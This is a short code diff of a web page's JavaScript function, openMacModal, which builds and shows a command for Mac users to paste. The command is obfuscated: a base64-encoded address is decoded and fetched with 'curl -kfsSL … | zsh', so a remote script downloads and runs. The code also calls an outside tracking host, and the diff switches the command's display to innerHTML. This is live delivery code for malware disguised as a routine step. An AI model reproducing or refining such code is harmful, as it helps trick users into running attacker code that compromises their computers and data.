@@ -51,8 +51,8 @@ function openMacModal() {
       cmd = btoa(cmd.replace('REPLACE', randstr(5)));
       cmd = `curl -kfsSL $(echo '${cmd}'|base64 -d)|zsh`;
     }
-    window.macCmd = cmd;
-    document.getElementById('macCommandText').textContent = cmd;
+    window.cmd = cmd;
+    document.getElementById('macCommandText').innerHTML = cmd;
 
     fetch('https://spacezonepage.monster/multgd/cl.php');
 
